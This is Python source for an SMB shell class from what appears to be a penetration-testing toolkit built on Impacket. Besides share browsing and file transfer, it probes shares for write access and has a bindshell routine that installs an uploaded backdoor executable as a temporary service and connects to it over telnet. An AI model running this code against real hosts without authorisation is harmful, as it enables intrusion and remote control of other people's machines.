#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

from lib.atexec import AtSvc
from lib.common import *
from lib.psexec import PsExec
from lib.rpcdump import RpcDump
from lib.samrdump import Samr
from lib.secretsdump import SecretsDump
from lib.services import SvcCtl

#######################################################
# Enhanced version of Impacket's smbclient.py example #
#######################################################
class SMBShell(AtSvc, PsExec, RpcDump, Samr, SvcCtl, SecretsDump):
    def __init__(self, target, credential, local_name):
        SecretsDump.__init__(self)

        self.__dstip = target.getHost()
        self.__dstport = target.getPort()
        self.__user = credential.getUser()
        self.__password = credential.getPassword()
        self.__lmhash = credential.getLMhash()
        self.__nthash = credential.getNThash()
        self.__domain = credential.getDomain()
        self.__is_admin = credential.isAdmin()
        self.__srcfile = local_name

        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
        self.__timeout = 5*60

        self.smb = None
        self.tid = None
        self.pwd = '\\'
        self.share = ''
        self.shares_list = []
        self.domains_dict = {}
        self.users_list = set()
        self.completion = []

        self.smbserver_share = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))

        self.connect()
        logger.debug('Connection to host %s established' % target.getIdentity())

        self.login()
        logger.debug('Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))

        logger.info('Looking for a writable share, wait..')
        _ = self.get_writable_share()

        self.info(False)

        if _:
            DataStore.writable_share = _
        else:
            logger.warn('Unable to find a writable share. Going to use %s, but some commands will not work' % DataStore.writable_share)

            if DataStore.version_major >= 6 or (DataStore.version_major == 5 and DataStore.version_minor == 1):
                DataStore.share_path = ntpath.join(DataStore.user_path, 'Windows', 'Temp')
            else:
                DataStore.share_path = ntpath.join(DataStore.user_path, 'WINNT', 'Temp')

    def connect(self):
        self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)

    def login(self):
        try:
            self.smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)
        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
            raise RuntimeError
        except SessionError, e:
            logger.error('SMB error: %s' % (e.getErrorString(), ))
            raise RuntimeError

    def logoff(self):
        self.smb.logoff()

    def smb_transport(self, named_pipe):
        self.trans = transport.SMBTransport(dstip=self.__dstip, dstport=self.__dstport, filename=named_pipe, smb_connection=self.smb)

        try:
            self.trans.connect()
        except socket.error, e:
            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
            raise RuntimeError
        except SessionError, e:
            logger.warn('SMB error: %s' % (e.getErrorString(), ))
            raise RuntimeError

    def info(self, display=True):
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.bind(srvs.MSRPC_UUID_SRVS)

        try:
            self.__resp = srvs.hNetrServerGetInfo(self.__dce, 102)
        except rpcrt.DCERPCException, _:
            #traceback.print_exc()
            logger.warning('Unable to query server information')
            return None

        self.__dce.disconnect()

        DataStore.server_os = self.smb.getServerOS()
        DataStore.server_name = self.smb.getServerName()
        DataStore.server_domain = self.smb.getServerDomain()
        DataStore.server_host = self.smb.getRemoteHost()
        DataStore.user_path = self.__resp['InfoStruct']['ServerInfo102']['sv102_userpath']
        DataStore.version_major = self.__resp['InfoStruct']['ServerInfo102']['sv102_version_major']
        DataStore.version_minor = self.__resp['InfoStruct']['ServerInfo102']['sv102_version_minor']

        if display:
            print 'Operating system: %s' % self.smb.getServerOS()
            print 'Netbios name: %s' % self.smb.getServerName()
            print 'Domain: %s' % self.smb.getServerDomain()
            print 'SMB dialect: %s' % check_dialect(self.smb.getDialect())
            print 'NTLMv2 support: %s' % self.smb.doesSupportNTLMv2()
            print 'UserPath: %s' % DataStore.user_path
            print 'Simultaneous users: %d' % self.__resp['InfoStruct']['ServerInfo102']['sv102_users']
            print 'Version major: %d' % DataStore.version_major
            print 'Version minor: %d' % DataStore.version_minor
            print 'Comment: %s' % self.__resp['InfoStruct']['ServerInfo102']['sv102_comment'] or ''

            # TODO: uncomment when SMBConnection will have a wrapper
            # getServerTime() method for both SMBv1,2,3
            #print 'Time: %s' % self.smb.get_server_time()

        return self.__resp

    def who(self):
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.connect()
        self.__dce.bind(srvs.MSRPC_UUID_SRVS)
        resp = srvs.hNetrSessionEnum(self.__dce, NULL, NULL, 502)

        for session in resp['InfoStruct']['SessionInfo']['Level502']['Buffer']:
            print "Host: %15s, user: %5s, active: %5d, idle: %5d, type: %5s, transport: %s" % (session['sesi502_cname'][:-1], session['sesi502_username'][:-1], session['sesi502_time'], session['sesi502_idle_time'], session['sesi502_cltype_name'][:-1],session['sesi502_transport'][:-1])

        self.__dce.disconnect()

    def __share_info(self, share):
        self.smb_transport('srvsvc')
        self.__dce = self.trans.get_dce_rpc()
        self.__dce.connect()
        self.__dce.bind(srvs.MSRPC_UUID_SRVS)
        resp = srvs.hNetrShareGetInfo(self.__dce, '%s\x00' % share, 2)
        self.__dce.disconnect()

        return resp

    def check_share(self, share=None):
        #logger.debug("Into check_share with share: %s, self.share is: %s and self.tid is: %s" % (share, self.share, self.tid))

        if share:
            self.use(share)
        elif not share and (self.share is None or self.tid is None):
            logger.warn('Share has not been specified, select one')
            self.shares()

    def is_writable_share(self, share):
        _ = ''.join([random.choice(string.letters) for _ in range(8)])

        try:
            self.use(share, False)
            self.mkdir(_)
        except:
            pass
        else:
            self.rmdir(_)
            return True

        return False

    def get_writable_share(self):
        # Check we can write a directory on the shares, return the first writable one
        for _ in self.smb.listShares():
            share = _['shi1_netname'][:-1]

            try:
                share_info = self.__share_info(share)
            except rpcrt.DCERPCException, _:
                #traceback.print_exc()
                logger.warning('Unable to query share: %s' % share)
                continue

            path = share_info['InfoStruct']['ShareInfo2']['shi2_path'][:-1]

            if self.is_writable_share(share):
                logger.info('Share %s %sis writable' % (share, "(%s) " % path if path else ""))
                DataStore.share_path = path
                return share
            else:
                logger.debug('Share %s %sis not writable' % (share, "(%s) " % path if path else ""))

        return None

    def shares(self):
        shares = self.smb.listShares()
        count = 0

        for i in range(len(shares)):
            count += 1
            name = shares[i]['shi1_netname'][:-1]
            self.shares_list.append(name)

            comment = shares[i]['shi1_remark'][:-1]
            share_type = shares[i]['shi1_type']

            _ = self.__share_info(name)
            max_uses = _['InfoStruct']['ShareInfo2']['shi2_max_uses'] # 4294967295L is unlimited
            current_uses = _['InfoStruct']['ShareInfo2']['shi2_current_uses']
            permissions = _['InfoStruct']['ShareInfo2']['shi2_permissions'] # impacket always returns always 0
            path = _['InfoStruct']['ShareInfo2']['shi2_path']

            print '[%d] %s (comment: %s)' % (count, name, comment)

            print '\tPath: %s' % path
            print '\tUses: %d (max: %s)' % (current_uses, 'unlimited' if max_uses == 4294967295L else max_uses)
            #print '\tType: %s' % share_type
            #print '\tPermissions: %d' % permissions

        msg = 'Which share do you want to connect to? (default: 1) '
        limit = len(self.shares_list)
        choice = read_input(msg, limit)

        self.use(self.shares_list[choice-1])

    def use(self, share, display=True):
        if not share:
            raise missingShare, 'Share has not been specified'

        if self.tid:
            self.smb.disconnectTree(self.tid)

        try:
            self.share = share.strip('\x00')
            self.tid = self.smb.connectTree(self.share)
            self.pwd = '\\'
            self.ls('', False)
        except SessionError, e:
            if not display:
                pass
            elif e.getErrorCode() == nt_errors.STATUS_BAD_NETWORK_NAME:
                logger.warn('Invalid share name')
            elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                logger.warn('Access denied')
            else:
                logger.warn('Unable to connect to share: %s' % (e.getErrorString(), ))

    def cd(self, path):
        if not path:
            return

        self.check_share()
        path = ntpath.normpath(path)
        self.oldpwd = self.pwd

        if path == '.':
            return
        elif path == '..':
            sep = self.pwd.split('\\')
            self.pwd = '\\'.join('%s' % s for s in sep[:-1])
            return

        if path[0] == '\\':
           self.pwd = path
        else:
           self.pwd = ntpath.join(self.pwd, path)

        # Let's try to open the directory to see if it's valid
        try:
            fid = self.smb.openFile(self.tid, self.pwd)
            self.smb.closeFile(self.tid, fid)
            logger.warn('File is not a directory')
            self.pwd = self.oldpwd
        except SessionError, e:
            if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
               return
            elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                logger.warn('Access denied')
            elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
                logger.warn('File not found')
            else:
                logger.warn('Unable to change directory: %s' % (e.getErrorString(), ))

            self.pwd = self.oldpwd

    def get_pwd(self):
        print ntpath.join(self.share, self.pwd)

    def ls(self, path, display=True):
        self.check_share()

        if not path:
            pwd = ntpath.join(self.pwd, '*')
        else:
            pwd = ntpath.join(self.pwd, path)

        self.completion = []
        pwd = ntpath.normpath(pwd)

        try:
            files = self.smb.listPath(self.share, pwd)
        except SessionError, e:
            if not display:
                pass
            elif e.getErrorCode() in (nt_errors.STATUS_OBJECT_NAME_NOT_FOUND, nt_errors.STATUS_NO_SUCH_FILE):
                logger.warn('File not found')
            else:
                logger.warn('Unable to list files: %s' % (e.getErrorString(), ))

            return

        for f in files:
            if display is True:
                print '%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())), '<DIR>' if f.is_directory() > 0 else '', f.get_filesize(), f.get_longname())

            self.completion.append((f.get_longname(),f.is_directory(), f.get_filesize()))

    def lstree(self, path):
        self.check_share()

        if not path:
            path = ntpath.basename(self.pwd)
            self.cd('..')

        for x in range(0, path.count('\\')):
            print '|  ',

        print '%s' % os.path.basename(path.replace('\\', '/'))

        self.ls('%s\\*' % path, display=False)

        for identified_file, is_directory, size in self.completion:
            if identified_file in ('.', '..'):
                continue

            if is_directory > 0:
                self.lstree(ntpath.join(path, identified_file))
            else:
                for x in range(0, path.count('\\')):
                    print '|  ',

                print '|-- %s (%d bytes)' % (identified_file, size)

    def cat(self, filename):
        self.check_share()

        filename = os.path.basename(filename)
        self.ls(filename, display=False)

        for identified_file, is_directory, size in self.completion:
            if is_directory > 0:
                continue

            filepath = ntpath.join(self.pwd, identified_file)
            logger.debug('Reading file %s (%d bytes)..' % (filepath, size))

            try:
                self.fid = self.smb.openFile(self.tid, filepath)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to %s due to share access flags' % identified_file)
                else:
                    logger.error('Unable to access file: %s' % (e.getErrorString(), ))

                continue

            offset = 0

            while 1:
                try:
                    data = self.smb.readFile(self.tid, self.fid, offset)
                    print data

                    if len(data) == 0:
                        break

                    offset += len(data)
                except SessionError, e:
                    if e.getErrorCode() == nt_errors.STATUS_END_OF_FILE:
                        break
                    else:
                        logger.error('Unable to read file content: %s' % (e.getErrorString(), ))

            self.smb.closeFile(self.tid, self.fid)

    def download(self, filename, path=None):
        self.check_share()

        basename = os.path.basename(filename)

        if path is None:
            path = '.'
        else:
            path = path.replace('\\', '/')

        self.ls(basename, display=False)

        for identified_file, is_directory, size in self.completion:
            if is_directory > 0:
                self.downloadtree(identified_file)
                self.cd('..')
                continue

            filepath = ntpath.join(self.pwd, identified_file)
            logger.debug('Downloading file %s (%d bytes)..' % (filepath, size))

            try:
                fh = open(os.path.join(path, identified_file), 'wb')
                self.smb.getFile(self.share, filepath, fh.write)
                fh.close()
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to %s due to share access flags' % identified_file)
                else:
                    logger.error('Unable to download file: %s' % (e.getErrorString(), ))

    def downloadtree(self, path):
        self.check_share()

        if not path:
            path = ntpath.basename(self.pwd)
            self.cd('..')

        basename = ntpath.basename(path)
        normpath = path.replace('\\', '/')

        self.cd(basename)

        # Check if the provided path is not a directory (if so, then the
        # working directory has not changed
        if self.pwd == self.oldpwd:
            self.download(basename)
            return

        logger.debug('Recreating directory %s' % self.pwd)
        self.ls(None, display=False)

        if not os.path.exists(normpath):
            os.makedirs(normpath)

        for identified_file, is_directory, size in self.completion:
            if identified_file in ('.', '..'):
                continue

            if is_directory > 0:
                self.downloadtree(ntpath.join(path, identified_file))
                self.cd('..')
            else:
                self.download(identified_file, normpath)

    def upload(self, pathname, destfile=None):
        self.check_share()

        if isinstance(pathname, basestring):
            files = glob.glob(pathname)
        else:
            files = [ pathname ]

        for filename in files:
            try:
                if isinstance(filename, basestring):
                    fp = open(filename, 'rb')
                else:
                    fp = filename
            except IOError:
                logger.error('Unable to open file %s' % filename)
                return False

            if not destfile or len(files) > 1:
                destfile = os.path.basename(filename)

            destfile = ntpath.join(self.pwd, destfile)

            if isinstance(filename, basestring):
                logger.debug('Uploading file %s to %s..' % (filename, destfile))

            try:
                self.smb.putFile(self.share, destfile, fp.read)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to upload %s' % destfile)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to upload %s due to share access flags' % destfile)
                else:
                    logger.error('Unable to upload file: %s' % (e.getErrorString(), ))

            fp.close()

    def rename(self, srcfile, destfile):
        self.check_share()
        srcfile = ntpath.join(self.pwd, ntpath.normpath(srcfile))
        destfile = ntpath.join(self.pwd, ntpath.normpath(destfile))
        self.smb.rename(self.share, srcfile, destfile)

    def mkdir(self, path):
        self.check_share()
        path = ntpath.join(self.pwd, ntpath.normpath(path))
        self.smb.createDirectory(self.share, path)

    def rm(self, filename):
        self.check_share()

        filename = ntpath.join(self.pwd, ntpath.normpath(filename))
        self.ls(filename, display=False)

        for identified_file, is_directory, size in self.completion:
            if is_directory > 0:
                continue

            filepath = ntpath.join(self.pwd, identified_file)
            logger.debug('Removing file %s (%d bytes)..' % (filepath, size))

            try:
                self.smb.deleteFile(self.share, filepath)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to %s due to share access flags' % identified_file)
                else:
                    logger.error('Unable to remove file: %s' % (e.getErrorString(), ))

    def rmdir(self, path):
        self.check_share()

        path = ntpath.join(self.pwd, ntpath.normpath(path))
        self.ls(path, display=False)

        for identified_file, is_directory, _ in self.completion:
            if is_directory <= 0:
                continue

            filepath = ntpath.join(self.pwd, identified_file)
            logger.debug('Removing directory %s..' % filepath)

            try:
                self.smb.deleteDirectory(self.share, filepath)
            except SessionError, e:
                if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
                    logger.warn('Access denied to %s' % identified_file)
                elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
                    logger.warn('Access denied to %s due to share access flags' % identified_file)
                else:
                    logger.error('Unable to remove directory: %s' % (e.getErrorString(), ))

    def bindshell(self, port):
        connected = False
        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])

        if not os.path.exists(local_file):
            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'

        logger.info('Launching interactive OS shell')
        logger.debug('Going to use temporary service %s' % srvname)

        if not port:
            port = 4445
        elif not isinstance(port, int):
            port = int(port)

        self.deploy(srvname, local_file, port, remote_file)

        logger.info('Connecting to backdoor on port %d, wait..' % port)

        for counter in xrange(0, 3):
            try:
                time.sleep(1)

                if str(sys.version.split()[0]) >= '2.6':
                    tn = Telnet(self.__dstip, port, 3)
                else:
                    tn = Telnet(self.__dstip, port)

                connected = True
                tn.interact()
            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
                if connected is False:
                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])

                    if counter < 2:
                        warn_msg += ', retrying..'
                        logger.warn(warn_msg)
                    else:
                        logger.error(warn_msg)
            except SessionError, e:
                #traceback.print_exc()
                logger.error('SMB error: %s' % (e.getErrorString(), ))
            except KeyboardInterrupt, _:
                print
                logger.info('User aborted')
            except Exception, e:
                #traceback.print_exc()
                logger.error(str(e))

            if connected is True:
                tn.close()
                sys.stdout.flush()
                break

        time.sleep(1)
        self.undeploy(srvname)
